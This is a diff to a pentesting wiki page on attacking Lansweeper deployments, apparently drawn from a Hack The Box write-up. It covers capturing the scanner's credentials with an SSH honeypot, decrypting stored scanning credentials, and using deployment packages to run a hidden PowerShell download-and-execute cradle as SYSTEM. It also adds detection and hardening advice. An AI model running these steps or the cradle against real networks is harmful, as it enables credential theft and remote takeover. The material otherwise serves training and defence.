@@ -27,15 +27,18 @@ Steps overview (web UI):
 Example with sshesame:<sup>[[2]](#references)</sup>
 
 ```yaml
-# sshesame.conf
+# sshesame.yaml
 server:
-  listen_address: 10.10.14.79:2022
+  listen_address: 0.0.0.0:2022
 ```
 
 ```bash
-# Install and run
-sudo apt install -y sshesame
-sshesame --config sshesame.conf
+# Prefer a current release/container; the package in Debian-derived repositories may be stale
+sshesame -config sshesame.yaml
+
+# Or run the maintained container image
+docker run --rm -it -p 2022:2022 \
+  -v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
 # Expect client banner similar to RebexSSH and cleartext creds
 # authentication for user "svc_inventory_lnx" with password "<password>" accepted
 # connection with client version "SSH-2.0-RebexSSH_5.0.x" established
@@ -51,8 +54,13 @@ netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
 
 Notes
-- Works similarly for other protocols when you can coerce the scanner to your listener (SMB/WinRM honeypots, etc.). SSH is often the simplest.
+- Other protocols are not equivalent: an SMB/WinRM listener normally obtains an NTLM challenge-response rather than a cleartext password. Cracking or relaying it depends on the negotiated protocol protections; see [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). SSH password authentication is usually the simplest cleartext case.
+- SSH public-key authentication exposes the username and public-key fingerprint to the server, **not** the private key or its passphrase. Recover key-backed credentials from the compromised Lansweeper server instead of expecting a honeypot to disclose them.<sup>[[2]](#references)</sup>
 - Many scanners identify themselves with distinct client banners (e.g., RebexSSH) and will attempt benign commands (uname, whoami, etc.).
+
+### Credential selection order matters
+
+For a rescan, Lansweeper first retries the credential that last succeeded for that asset, then the explicitly mapped credentials in their configured order, and finally the global credential of the same type. A honeypot that accepts the first password authentication therefore normally will not observe later fallback credentials; during an authorized credential-path assessment, log and reject attempts if the objective is to verify the complete fallback sequence.<sup>[[6]](#references)</sup>
 
 ## 2) AD ACL abuse: gain remote access by adding yourself to an app-admin group
 
@@ -100,17 +108,18 @@ Typical locations:
   - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
 - Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
 
-Use SharpLansweeperDecrypt to automate decryption and dumping of stored creds:<sup>[[3]](#references)</sup>
+Use SharpLansweeperDecrypt to automate decryption and dumping of stored creds. With no arguments, the current executable decrypts `web.config`, connects to the database and dumps all configured scanning credentials; `-e` also supports offline/manual decryption when an encrypted value and the key file are already available:<sup>[[3]](#references)</sup>
 
 ```powershell
-# From a WinRM session or interactive shell on the Lansweeper host
-# PowerShell variant
-Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
-powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
-# Tool will:
-#  - Decrypt connectionStrings from web.config
-#  - Connect to Lansweeper DB
-#  - Decrypt stored scanning credentials and print them in cleartext
+# Automatic: use the default web.config and Encryption.txt locations
+.\SharpLansweeperDecrypt.exe
+
+# Manual: decrypt one database value with an explicit key file
+.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
+  -p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'
+
+# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
+powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
 ```
 
 Expected output includes DB connection details and plaintext scanning credentials such as Windows and Linux accounts used across the estate. These often have elevated local rights on domain hosts:
@@ -129,7 +138,7 @@ netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
 
 ## 4) Lansweeper Deployment → SYSTEM RCE
 
-As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.<sup>[[1]](#references)</sup>
+As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Lansweeper uses an administrative scanning credential to reach the target's Task Scheduler and `C$`, then creates a task for the deployment. When the package uses the **System Account** run mode, the payload executes as `NT AUTHORITY\SYSTEM`; other run modes can use the mapped scanning credential or the currently logged-on user, so verify the selected mode rather than assuming SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>
 
 High-level steps:
 - Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
@@ -149,19 +158,26 @@ powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http
 OPSEC
 - Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Use judiciously.
 
+### Deployment artifacts and a second credential exposure point
+
+The scanner writes its deployment executable under `C:\Windows\LSDeployment` through `C$`. Package files are normally read from `DefaultPackageShare$`, backed by `C:\Program Files (x86)\Lansweeper\PackageShare`, or from an IP-range-specific package share. Importantly, Lansweeper documents that the package-share credential is stored in **reversibly encrypted form in the registry of every computer receiving a deployment**. Treat a compromised managed endpoint as a potential disclosure point for that share account, and inspect the deployment directory, scheduled-task history and configured package shares when reconstructing Lansweeper activity.<sup>[[7]](#references)</sup>
+
 ## Detection and hardening
 
 - Restrict or remove anonymous SMB enumerations. Monitor for RID cycling and anomalous access to Lansweeper shares.
 - Egress controls: block or tightly restrict outbound SSH/SMB/WinRM from scanner hosts. Alert on non-standard ports (e.g., 2022) and unusual client banners like Rebex.
 - Protect `Website\\web.config` and `Key\\Encryption.txt`. Externalize secrets into a vault and rotate on exposure. Consider service accounts with minimal privileges and gMSA where viable.
 - AD monitoring: alert on changes to Lansweeper-related groups (e.g., “Lansweeper Admins”, “Remote Management Users”) and on ACL changes granting GenericAll/Write membership on privileged groups.
-- Audit Deployment package creations/changes/executions; alert on packages spawning cmd.exe/powershell.exe or unexpected outbound connections.
+- Audit Deployment package creations/changes/executions and correlate new remote scheduled tasks with writes to `C:\Windows\LSDeployment`; alert on packages spawning `cmd.exe`/`powershell.exe` or unexpected outbound connections.
+- Give package-share credentials only **Read & Execute** permission and never reuse them for administration. Prefer agent-based inventory where practical: if all computers are scanned by an agent and the deployment module is unused, Lansweeper does not require stored computer scanning credentials.<sup>[[6]](#references)[[7]](#references)</sup>
 
 ## Related topics
-- SMB/LSA/SAMR enumeration and RID cycling
-- Kerberos password spraying and clock skew considerations
-- BloodHound path analysis of application-admin groups
-- WinRM usage and lateral movement
+- [SMB/LSA/SAMR enumeration and RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
+- [Kerberos authentication and clock-skew considerations](kerberos-authentication.md)
+- [BloodHound path analysis](bloodhound.md)
+- [WinRM usage and lateral movement](../lateral-movement/winrm.md)
+
+
 
 ## References
 - [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
@@ -169,5 +185,6 @@ OPSEC
 - [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
 - [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
 - [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
-
+- [6] [Create and map scanning credentials — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
+- [7] [Deployment requirements — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
 {{#include ../../banners/hacktricks-training.md}}
